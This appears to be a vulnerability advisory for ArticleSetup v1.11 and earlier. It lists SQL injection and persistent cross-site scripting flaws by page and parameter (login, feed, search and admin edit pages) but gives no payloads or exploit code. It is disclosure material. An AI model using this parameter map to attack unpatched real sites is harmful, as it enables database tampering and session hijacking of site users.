Overview:
---------
ArticleSetup Multiple Persistence Cross-Site Scripting and SQL Injection
Vulnerabilities.
 
 
Technical Description:
----------------------
ArticleSetup Multiple Persistence Cross-Site Scripting and SQL Injection
Vulnerabilities.
 
  i) Input passed via the &#039;userid&#039; and &#039;password&#039; parameter in
     &#039;/upload/login.php&#039; page is not properly verified before being used in
     an SQL query. This can be exploited to manipulate SQL queries by injecting
     arbitrary SQL queries.
 
 ii) Input passed via the &#039;userid&#039; and &#039;password&#039; parameter in
     &#039;/upload/admin/login.php&#039; page is not properly verified before being
     used in an SQL query. This can be exploited to manipulate SQL queries
     by injecting arbitrary SQL queries.
 
iii) Input passed via the &#039;cat&#039; parameter in &#039;upload/feed.php&#039; page is not
     properly verified before being used in an SQL query. This can be
     exploited to manipulate SQL queries by injecting arbitrary SQL queries.
 
 iV) Input passed via the &#039;s&#039; parameter in &#039;upload/search.php&#039; page is not
     properly verified before being used in an SQL query. This can be
     exploited to manipulate SQL queries by injecting arbitrary SQL queries.
 
 V)  Input passed via the &#039;id&#039; parameter in &#039;/upload/admin/pageedit.php&#039;,
     &#039;upload/admin/authoredit.php&#039; and &#039;/admin/categoryedit.php?id&#039; pages are
     not properly verified before being used in an SQL query. This can be
     exploited to manipulate SQL queries by injecting arbitrary SQL queries.
 
Vi)  Input passed via the &#039;s&#039; and parameter in &#039;/upload/search.php&#039; page is not
     properly verified before it is returned to the user. This can be exploited
     to execute arbitrary HTML and script code in a user&#039;s browser session in
     the context of a vulnerable site.
 
Vii) Input passed via the &#039;title&#039; and parameter in &#039;upload//author/submit.php&#039;
     page is not properly verified before it is returned to the user. This can
     be exploited to execute arbitrary HTML and script code in a user&#039;s browser
     session in the context of a vulnerable site.
 
Viii)Input passed via the &#039;title&#039; and parameter in &#039;/upload/admin/articlenew.php&#039;,
     &#039;/upload/admin/categories.php&#039; and &#039;/upload/admin/pages.php&#039; pages are not
     properly verified before it is returned to the user. This can be exploited
     to execute arbitrary HTML and script code in a user&#039;s browser session in
     the context of a vulnerable site.
 
  The vulnerabilities are tested in ArticleSetup v1.10 Other versions  may also
  be affected.
 
 
Impact:
--------
Successful exploitation could allow an attacker to execute arbitrary HTML
code in a user&#039;s browser session in the context of a vulnerable application
or to manipulate SQL queries by injecting arbitrary SQL code.
 
 
Affected Software:
------------------
ArticleSetup v1.11 and prior.
 
Tested on,
ArticleSetup v1.10, v1.11
